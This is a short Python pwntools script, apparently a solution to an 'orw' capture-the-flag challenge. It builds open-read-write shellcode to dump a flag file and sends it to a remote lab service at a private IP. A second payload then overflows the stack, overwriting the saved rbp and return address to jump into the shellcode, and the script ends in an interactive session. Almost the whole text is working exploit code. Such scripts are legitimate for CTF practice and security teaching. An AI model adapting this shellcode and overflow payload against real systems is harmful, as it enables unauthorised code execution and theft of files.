from pwn import *

# open("/home/orw/flag")
# read(fd, buf, 0x40)
# write(1, buf, 0x40)

context.arch = 'amd64'

shellcode = asm(
    shellcraft.open('/home/orw/flag') +
    shellcraft.read('rax', 'rsp', 0x40) +
    shellcraft.write(1, 'rsp', 0x40)
)

conn = remote('192.168.122.129', 10171)


target = 0x6010a0
old_rbp = 0x00007fffffffd960 # need to push to writable memory
payload1 = shellcode.ljust(0x100, b'\x90') # pad so we can feed to gdb via redirect
payload2 = b'A' * 0x10 + p64(old_rbp) + p64(target)

with open('./input.data', 'wb') as f:
    f.write(payload1)
    f.write(payload2)
print(f"[+] Payloads written to input.data")

print(f"Sending shell payload... {payload1} (len: {len(payload1)})")
conn.sendafter(b'shellcode>', payload1) 
# note that sendline will add \n and it will be read by next read() 
# if you want to sendline, payload1 should be 0xff long instead.
print(f"Sending target address... {payload2} (len: {len(payload2)})") 
conn.sendlineafter(b':)', payload2)
conn.interactive()


